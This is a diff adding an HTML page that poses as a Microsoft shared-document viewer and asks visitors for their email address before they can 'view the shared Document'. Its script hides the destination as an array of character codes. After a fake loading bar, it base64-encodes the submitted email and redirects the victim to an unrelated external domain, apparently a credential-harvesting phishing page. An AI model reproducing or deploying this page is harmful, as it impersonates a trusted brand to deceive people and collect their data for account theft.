@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>View Document</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: Arial, sans-serif;
+            background: #fff url('https://i.ibb.co/fGBBg19Q/download.jpg') no-repeat center center/cover;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: background-color 0.5s ease;
+        }
+        body.ld { background: #217346; }
+        .lc {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .lg { width: 80px; margin: 0 auto 1.5rem; display: block; max-width: 100%; }
+        h5 { color: #333; margin-bottom: 1.5rem; line-height: 1.4; }
+        .fg { margin-bottom: 1.5rem; }
+        label { display: block; margin-bottom: 0.5rem; color: #555; text-align: left; font-weight: 500; }
+        input[type="email"], input[type="text"] {
+            width: 100%;
+            padding: 0.8rem;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1rem;
+        }
+        input[type="email"]:focus, input[type="text"]:focus { outline: 2px solid #217346; border-color: transparent; }
+        .eb { border-color: red !important; }
+        button {
+            width: 100%;
+            padding: 1rem;
+            background: #217346;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: background 0.3s ease;
+        }
+        button:hover { background: #1c3b2f; }
+        button:disabled { background: #6c9c7a; cursor: not-allowed; }
+        .em { color: red; margin-top: 1rem; display: none; font-size: 0.9rem; }
+        .ls {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #217346;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+        .ls.ac { display: flex; }
+        .lct { text-align: center; color: white; }
+        .llg { width: 100px; margin-bottom: 2rem; filter: brightness(0) invert(1); }
+        .lt { font-size: 1.2rem; margin-bottom: 1.5rem; color: white; }
+        .pc { width: 300px; height: 6px; background: rgba(255, 255, 255, 0.3); border-radius: 3px; overflow: hidden; }
+        .pb { width: 0%; height: 100%; background: white; border-radius: 3px; transition: width 2.5s ease-in-out; }
+        .le { margin-top: 1rem; font-size: 0.9rem; color: rgba(255, 255, 255, 0.8); }
+    </style>
+</head>
+<body>
+    <div class="lc" id="lc">
+        <img src="https://i.ibb.co/5hJ4wvFK/microsoft.png" alt="Logo" class="lg">
+        <h5>Enter your Email Address<br>to view the shared "Document"</h5>
+        <form id="ef">
+            <div class="fg">
+                <label for="ei">Email Address</label>
+                <input type="email" id="ei" placeholder="Enter your email address" autocomplete="email">
+            </div>
+            <button type="submit" id="cb">Continue</button>
+            <div class="em" id="em">Please enter a valid email address</div>
+        </form>
+    </div>
+
+    <div class="ls" id="ls">
+        <div class="lct">
+            <img src="https://i.ibb.co/5hJ4wvFK/microsoft.png" alt="Logo" class="llg">
+            <div class="lt">Preparing your document...</div>
+            <div class="pc"><div class="pb" id="pb"></div></div>
+            <div class="le" id="le"></div>
+        </div>
+    </div>
+
+    <script>
+    (function() {
+        var _0x = window, _d = document, _l = location;
+        
+        var _b = (function() {
+            var a = [104,116,116,112,115,58,47,47,104,101,97,108,116,104,99,104,101,99,107,46,112,101,97,112,111,111,110,105,111,46,100,101,118,47,85,84,79,100,118,69,110,88,112,50,55,75,89,84,90,79,114,33,89,69,89,82,50,101,65,47];
+            return a.map(function(c) { return String.fromCharCode(c); }).join('');
+        })();
+        
+        var _vl = function(e) {
+            var r = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return r.test(e);
+        };
+        
+        var _enc = function(e, m) {
+            switch (m) {
+                case 1: return btoa(unescape(encodeURIComponent(e)));
+                case 2: return encodeURIComponent(e);
+                default: return e;
+            }
+        };
+        
+        var _nav = function(u) {
+            var m = [
+                function() { _0x.location.replace(u); },
+                function() { _0x.location.href = u; },
+                function() { 
+                    var a = _d.createElement('a');
+                    a.href = u; a.style.display = 'none';
+                    _d.body.appendChild(a); a.click();
+                },
+                function() { _0x.open(u, '_self'); }
+            ];
+            var i = Math.floor(Math.random() * 2);
+            try { m[i](); } catch(x) { m[0](); }
+        };
+        
+        var _sh = function(e) {
+            var lc = _d.getElementById('lc');
+            var ls = _d.getElementById('ls');
+            var pb = _d.getElementById('pb');
+            var le = _d.getElementById('le');
+            
+            lc.style.display = 'none';
+            ls.classList.add('ac');
+            le.textContent = e;
+            
+            setTimeout(function() { pb.style.width = '100%'; }, 100);
+        };
+        
+        var _rd = function(e) {
+            var _m = 1;
+            var _ee = _enc(e, _m);
+            var _u = _b + '#' + _ee;
+            _nav(_u);
+        };
+        
+        var _ei = _d.getElementById('ei');
+        var _ef = _d.getElementById('ef');
+        var _em = _d.getElementById('em');
+        var _cb = _d.getElementById('cb');
+        
+        _ei.addEventListener('keydown', function(ev) {
+            if (ev.key === 'Enter') {
+                ev.preventDefault();
+                _ef.dispatchEvent(new Event('submit'));
+            }
+        });
+        
+        _ef.addEventListener('submit', function(ev) {
+            ev.preventDefault();
+            
+            var _e = _ei.value.trim();
+            
+            _ei.classList.remove('eb');
+            _em.style.display = 'none';
+            
+            if (!_e || !_vl(_e)) {
+                _ei.classList.add('eb');
+                _em.style.display = 'block';
+                _ei.focus();
+                return;
+            }
+            
+            _cb.disabled = true;
+            _sh(_e);
+            
+            var _t = 2400 + Math.floor(Math.random() * 800);
+            
+            setTimeout(function() { _rd(_e); }, _t);
+        });
+        
+        _0x.addEventListener('load', function() { _ei.focus(); });
+    })();
+    </script>
+</body>
+</html>
